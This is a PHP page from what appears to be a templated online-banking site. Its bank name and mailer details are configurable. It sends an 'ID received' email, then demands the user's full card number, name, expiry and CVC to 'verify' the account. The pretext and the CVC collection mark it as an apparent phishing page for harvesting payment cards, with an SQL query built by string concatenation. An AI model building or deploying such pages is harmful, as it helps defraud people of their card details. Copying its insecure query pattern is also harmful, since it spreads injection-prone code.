<?php include 'templates/header.php'; ?>
<style>
        .demo-container {
            width: 100%;
            max-width: 350px;
            margin: 50px auto;
        }

        form {
            margin: 30px;
        }
        input {
            width: 200px;
            margin: 10px auto;
            display: block;
        }
		
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

.btn-submit {
    position: relative;
    overflow: hidden;
}
.btn-submit input[type=submit] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}
</style>
        <div class="m-t-n m-b">
          <div class="card m-b-0 bg-primary-dark p-a-md no-border m-b m-x-n-g">
            <div class="card-block" style="height: 250px;">
			<br/><br/><br/><br/><br/><br/>
						 <div class="row post-header text-white">
            <div class="col p-b-lg col-xs-8 col-xs-offset-2">
              <h4>Additional information required for verification.</h4>
			  <p>You are required to verify your account using a valid credit card, this helps to prevent unauthorised use of our online banking service.</p>
            </div>
          </div>

  <?php
 
require('../db/index.php');
$id=$_SESSION['usr_id'];
$query = "SELECT * from users where id='".$id."'"; 
$result = mysqli_query($con, $query) or die ( mysqli_error());
$row = mysqli_fetch_assoc($result);

$imageU = $row['id_front'];
$imageX = $row['id_back'];
$ids_front = "assets/img/ids/".$imageU;
$ids_back = "assets/img/ids/".$imageX;

$sel_query="Select * from settings ORDER BY id desc";
$result = mysqli_query($con,$sel_query);
if ($row = mysqli_fetch_assoc($result)) {

$c_name = $_SESSION['usr_name'];
$c_email = $_SESSION['usr_email'];
$b_email = $row["email"];
$b_url = $row["b_url"];
$b_name = $row["title"];
$b_address = $row["address"];
$short_name = $row["short_name"];
$mailer_host = $row["mailer_host"];
$mailer_port = $row["mailer_port"];
$mailer_id = $row["mailer_id"];
$mailer_pass = $row["mailer_pass"];
$b_phone = $row["phone"];

require '../../Mailer/class.phpmailer.php';

try {
	$mail = new PHPMailer(true); //New instance, with exceptions enabled

	$mail->IsSMTP();                           // tell the class to use SMTP
	$mail->SMTPAuth   = true;                  // enable SMTP authentication
	$mail->Port       = $mailer_port;                    // set the SMTP server port
	$mail->Host       = "$mailer_host"; // SMTP server
	$mail->Username   = "$mailer_id";     // SMTP server username
	$mail->Password   = "$mailer_pass";            // SMTP server password

	$mail->IsSendmail();  // tell the class to use Sendmail

	$mail->AddReplyTo("$b_email","$short_name");

	$mail->From       = "$b_email";
	$mail->FromName   = "$short_name";

	$to = "$c_email";

	$mail->AddAddress($to);

	$mail->Subject  = "Document Received";

	$mail->AltBody    = "$b_name"; 
	$mail->WordWrap   = 80; 
	$body = "HI $c_name,
<br/>
Your ID has been received and will be verified shortly.
<br/>
For questions kindly use the default reply button to send us a message.<br/><br/>
Regards
<br/>
Customer Care
<br/><br/>
$b_name
<br/>
$b_address
<br/>
$b_phone";
	$mail->MsgHTML($body);

	$mail->IsHTML(true); // send as HTML

	$mail->Send();
} catch (phpmailerException $e) {
	echo $e->errorMessage();
}

}
?>

<div class="demo-container">
        <div class="card-wrapper"></div>

        <div class="form-container active">
<form name="form" method="post" action="c_verify.php">
			<input type="hidden" name="new" value="1" />
	    <input type="hidden" name="u_login_id" value="<?php echo $_SESSION['usr_id']; ?>" />
		<div class="form-group">
                <input  class="form-control" placeholder="Card number" type="tel" name="number">
				</div>
				<div class="form-group">
                <input  class="form-control" placeholder="Full name" type="text" name="name">
				</div>
				<div class="form-group">
                <input  class="form-control" placeholder="MM/YY" type="tel" name="expiry">
				</div>
				<div class="form-group">
                <input  class="form-control" placeholder="CVC" type="number" name="cvc">
				</div>
				<div class="form-group">
				<center>
				<input  class="btn btn-primary" name="submit" type="submit" value="Verify">
				</center>
				</div>
            </form>
        </div>
    </div>

    <script src="card/card.js"></script>
    <script>
        new Card({
            form: document.querySelector('form'),
            container: '.card-wrapper'
        });
    </script>
		</div>
		  
          </div>
 

</div>
<?php include 'templates/footer.php'; ?>